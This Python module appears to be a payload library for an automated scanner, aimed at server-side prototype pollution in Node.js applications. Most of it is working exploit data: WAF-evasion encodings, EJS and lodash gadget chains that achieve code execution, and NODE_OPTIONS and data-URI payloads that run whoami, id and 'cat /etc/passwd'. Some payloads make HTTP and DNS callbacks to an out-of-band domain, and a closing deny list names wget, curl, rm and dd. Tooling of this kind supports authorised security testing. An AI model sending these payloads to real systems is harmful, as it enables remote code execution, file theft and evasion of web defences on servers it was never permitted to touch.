"""
Prototype Pollution Payload Library

Centralized collection of:
- Basic pollution detection payloads
- Encoding bypass variants (URL, Unicode, obfuscation)
- Gadget chain payloads for framework exploitation
- RCE escalation payloads (timing, DNS, command output)

Sources:
- PayloadsAllTheThings Prototype Pollution
- HackTricks RCE via Prototype Pollution
- KTH-LangSec Server-Side Prototype Pollution Research
- Silent Spring (USENIX 2023) Universal Gadgets
"""

from typing import List, Dict, Any
import json
import base64

# Unique marker for pollution confirmation (allows detection in responses)
POLLUTION_MARKER = "pp_bugtrace_12345"

# ============================================================================
# TIER 1: Basic Pollution Detection Payloads (LOW severity)
# ============================================================================
# These confirm pollution exists without proving impact

BASIC_POLLUTION_PAYLOADS: List[Dict[str, Any]] = [
    # __proto__ variants
    {
        "payload": {"__proto__": {"polluted": POLLUTION_MARKER}},
        "technique": "proto_basic",
        "desc": "Standard __proto__ pollution",
        "method": "JSON_BODY",
    },
    {
        "payload": {"__proto__": {"isAdmin": True}},
        "technique": "proto_privilege",
        "desc": "Privilege escalation attempt",
        "method": "JSON_BODY",
    },
    # constructor.prototype variants (bypass __proto__ filters)
    {
        "payload": {"constructor": {"prototype": {"polluted": POLLUTION_MARKER}}},
        "technique": "constructor_proto",
        "desc": "Constructor.prototype pollution (bypasses __proto__ filter)",
        "method": "JSON_BODY",
    },
    {
        "payload": {"constructor": {"prototype": {"isAdmin": True}}},
        "technique": "constructor_privilege",
        "desc": "Privilege via constructor chain",
        "method": "JSON_BODY",
    },
]

# Query parameter variants of basic payloads
QUERY_PARAM_PAYLOADS: List[Dict[str, str]] = [
    {"query": "__proto__[polluted]={marker}", "technique": "query_bracket"},
    {"query": "__proto__.polluted={marker}", "technique": "query_dot"},
    {"query": "constructor[prototype][polluted]={marker}", "technique": "query_constructor_bracket"},
    {"query": "constructor.prototype.polluted={marker}", "technique": "query_constructor_dot"},
]

# ============================================================================
# TIER 2: Encoding Bypass Payloads (MEDIUM severity)
# ============================================================================
# WAF evasion techniques

ENCODING_BYPASSES: List[Dict[str, Any]] = [
    # Nested obfuscation (evades simple string.replace filters)
    {
        "payload": {"__pro__proto__to__": {"polluted": POLLUTION_MARKER}},
        "technique": "nested_obfuscation",
        "desc": "Nested string bypass",
        "method": "JSON_BODY",
    },
    {
        "payload": {"constconstructorructor": {"prototype": {"polluted": POLLUTION_MARKER}}},
        "technique": "nested_constructor",
        "desc": "Nested constructor bypass",
        "method": "JSON_BODY",
    },
    # URL-encoded variants (for query params)
    {
        "query": "%5F%5Fproto%5F%5F[polluted]={marker}",
        "technique": "url_encoded",
        "desc": "URL-encoded __proto__",
        "method": "QUERY_PARAM",
    },
    # Unicode variants
    {
        "payload": {"\\u005F\\u005Fproto\\u005F\\u005F": {"polluted": POLLUTION_MARKER}},
        "technique": "unicode_escape",
        "desc": "Unicode-escaped __proto__",
        "method": "JSON_BODY",
    },
    # Null byte injection
    {
        "payload_raw": '{"__proto__\\u0000": {"polluted": "' + POLLUTION_MARKER + '"}}',
        "technique": "null_byte",
        "desc": "Null byte injection",
        "method": "JSON_BODY_RAW",
    },
    # Bracket notation
    {
        "payload": {"['__proto__']": {"polluted": POLLUTION_MARKER}},
        "technique": "bracket_notation",
        "desc": "Bracket notation bypass",
        "method": "JSON_BODY",
    },
]

# ============================================================================
# TIER 3: Gadget Chain Payloads (MEDIUM-HIGH severity)
# ============================================================================
# Framework-specific gadgets that enable further exploitation

GADGET_CHAIN_PAYLOADS: List[Dict[str, Any]] = [
    # Express json spaces gadget (Express < 4.17.4)
    {
        "payload": {"__proto__": {"json spaces": 10}},
        "technique": "express_json_spaces",
        "desc": "Express JSON spaces gadget (detect via response formatting)",
        "detection": "Check if JSON response has extra spacing",
        "framework": "express",
        "method": "JSON_BODY",
    },
    # Environment variable pollution
    {
        "payload": {"__proto__": {"env": {"PP_TEST": "polluted"}}},
        "technique": "env_pollution",
        "desc": "Environment variable injection",
        "detection": "May affect child_process spawns",
        "method": "JSON_BODY",
    },
    # Shell option pollution
    {
        "payload": {"__proto__": {"shell": "node"}},
        "technique": "shell_option",
        "desc": "Shell option for child_process",
        "detection": "Changes spawn/exec behavior",
        "method": "JSON_BODY",
    },
    # argv0 pollution (cmdline gadget)
    {
        "payload": {"__proto__": {"argv0": "node"}},
        "technique": "argv0",
        "desc": "argv0 option for process spawning",
        "method": "JSON_BODY",
    },
    # EJS template engine RCE gadget
    {
        "payload": {
            "__proto__": {
                "client": 1,
                "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('whoami')"
            }
        },
        "technique": "ejs_rce",
        "desc": "EJS template engine RCE",
        "framework": "ejs",
        "method": "JSON_BODY",
    },
    # Lodash template sourceURL gadget
    {
        "payload": {
            "__proto__": {
                "sourceURL": "\\nprocess.mainModule.require('child_process').execSync('whoami')//"
            }
        },
        "technique": "lodash_sourceurl",
        "desc": "Lodash template sourceURL RCE",
        "framework": "lodash",
        "method": "JSON_BODY",
    },
]

# ============================================================================
# TIER 4: RCE Escalation Payloads (HIGH-CRITICAL severity)
# ============================================================================
# Prove Remote Code Execution impact

RCE_GADGETS: List[Dict[str, Any]] = [
    # Timing attack via sleep (blind RCE proof)
    {
        "payload": {
            "__proto__": {
                "env": {"EVIL": "require('child_process').execSync('sleep 5')"},
                "NODE_OPTIONS": "--require /proc/self/environ"
            }
        },
        "technique": "rce_timing",
        "desc": "Timing attack - sleep 5 seconds",
        "detection": "response_time >= 4.5 seconds",
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
    # Computation delay (Windows-compatible)
    {
        "payload": {
            "__proto__": {
                "NODE_OPTIONS": "--eval=let s=Date.now();while(Date.now()-s<5000);"
            }
        },
        "technique": "rce_compute_delay",
        "desc": "Computation delay - 5 second loop",
        "detection": "response_time >= 4.5 seconds",
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
    # whoami command (visible RCE proof)
    {
        "payload": {
            "__proto__": {
                "env": {"EVIL": "console.log(require('child_process').execSync('whoami').toString())"},
                "NODE_OPTIONS": "--require /proc/self/environ"
            }
        },
        "technique": "rce_whoami",
        "desc": "Command execution - whoami",
        "detection": "username in response/logs",
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
    # id command (Unix)
    {
        "payload": {
            "__proto__": {
                "env": {"EVIL": "console.log(require('child_process').execSync('id').toString())"},
                "NODE_OPTIONS": "--require /proc/self/environ"
            }
        },
        "technique": "rce_id",
        "desc": "Command execution - id (Unix)",
        "detection": "uid/gid in response",
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
    # cat /etc/passwd (file read proof)
    {
        "payload": {
            "__proto__": {
                "env": {"EVIL": "console.log(require('child_process').execSync('cat /etc/passwd').toString())"},
                "NODE_OPTIONS": "--require /proc/self/environ"
            }
        },
        "technique": "rce_file_read",
        "desc": "File read - /etc/passwd",
        "detection": "root:x:0 in response",
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
    # DNS callback via NODE_OPTIONS --inspect
    {
        "payload": {
            "__proto__": {
                "NODE_OPTIONS": "--inspect={callback_domain}"
            }
        },
        "technique": "rce_dns_callback",
        "desc": "DNS callback via Node inspector",
        "detection": "DNS query to callback domain",
        "requires_callback": True,
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
    # HTTP callback
    {
        "payload": {
            "__proto__": {
                "env": {"EVIL": "require('http').get('http://{callback_domain}')"},
                "NODE_OPTIONS": "--require /proc/self/environ"
            }
        },
        "technique": "rce_http_callback",
        "desc": "HTTP callback for OOB confirmation",
        "detection": "HTTP request to callback domain",
        "requires_callback": True,
        "severity": "CRITICAL",
        "method": "JSON_BODY",
    },
]

# Data URI payloads (Node.js >= 19 with --import flag)
DATA_URI_PAYLOADS: List[Dict[str, Any]] = [
    {
        "technique": "data_uri_whoami",
        "command": "whoami",
        "severity": "CRITICAL",
    },
    {
        "technique": "data_uri_id",
        "command": "id",
        "severity": "CRITICAL",
    },
    {
        "technique": "data_uri_uname",
        "command": "uname -a",
        "severity": "CRITICAL",
    },
]


def build_data_uri_payload(command: str) -> Dict[str, Any]:
    """
    Build a data URI payload for Node.js >= 19.

    Args:
        command: Shell command to execute (should be safe/read-only)

    Returns:
        Payload dict with base64-encoded data URI
    """
    js_code = f"console.log(require('child_process').execSync('{command}').toString())"
    encoded = base64.b64encode(js_code.encode()).decode()
    data_uri = f"data:text/javascript;base64,{encoded}"

    return {
        "payload": {
            "__proto__": {
                "NODE_OPTIONS": f"--import {data_uri}"
            }
        },
        "technique": f"data_uri_{command.split()[0]}",
        "desc": f"Data URI RCE - {command}",
        "method": "JSON_BODY",
    }


# ============================================================================
# Tier Constants and Helper Functions
# ============================================================================

PAYLOAD_TIERS = {
    "pollution_detection": BASIC_POLLUTION_PAYLOADS,
    "encoding_bypass": ENCODING_BYPASSES,
    "gadget_chain": GADGET_CHAIN_PAYLOADS,
    "rce_exploitation": RCE_GADGETS,
}

TIER_SEVERITY = {
    "pollution_detection": "LOW",
    "encoding_bypass": "MEDIUM",
    "gadget_chain": "HIGH",
    "rce_exploitation": "CRITICAL",
}


def get_payloads_for_tier(tier: str, callback_domain: str = None) -> List[Dict[str, Any]]:
    """
    Get payloads for a specific exploitation tier.

    Args:
        tier: Payload tier (pollution_detection, encoding_bypass, gadget_chain, rce_exploitation)
        callback_domain: Domain for OOB callbacks (required for some RCE payloads)

    Returns:
        List of payload dicts with placeholders replaced
    """
    if tier not in PAYLOAD_TIERS:
        return []

    payloads = []
    for p in PAYLOAD_TIERS[tier]:
        payload_copy = p.copy()

        # Replace callback domain placeholder if needed
        if callback_domain and "{callback_domain}" in str(payload_copy.get("payload", {})):
            payload_str = json.dumps(payload_copy["payload"])
            payload_str = payload_str.replace("{callback_domain}", callback_domain)
            payload_copy["payload"] = json.loads(payload_str)
        elif payload_copy.get("requires_callback") and not callback_domain:
            continue  # Skip payloads that need callback domain

        payloads.append(payload_copy)

    return payloads


def get_all_payloads(callback_domain: str = None) -> List[Dict[str, Any]]:
    """Get all payloads across all tiers in order (stop-on-first-success pattern)."""
    all_payloads = []
    for tier in ["pollution_detection", "encoding_bypass", "gadget_chain", "rce_exploitation"]:
        all_payloads.extend(get_payloads_for_tier(tier, callback_domain))
    return all_payloads


def get_query_param_payloads(marker: str = POLLUTION_MARKER) -> List[str]:
    """
    Get query parameter pollution payloads with marker substituted.

    Returns:
        List of query strings ready to append to URL
    """
    payloads = []
    for p in QUERY_PARAM_PAYLOADS:
        query = p["query"].replace("{marker}", marker)
        payloads.append(query)
    return payloads


# Common vulnerable parameters that suggest merge/extend operations
VULNERABLE_PARAMS: List[str] = [
    "config", "settings", "options", "preferences",
    "user", "profile", "account", "data",
    "query", "filter", "params", "body",
    "metadata", "properties", "attributes", "fields",
    "payload", "input", "json", "object",
]

# Safe RCE commands for testing (read-only, no destructive operations)
SAFE_RCE_COMMANDS = ["whoami", "id", "hostname", "uname -a", "cat /etc/passwd"]

# Commands to NEVER use in automated testing
FORBIDDEN_COMMANDS = ["rm", "chmod", "chown", "wget -O", "curl -o", "mkfs", "dd", "> /"]
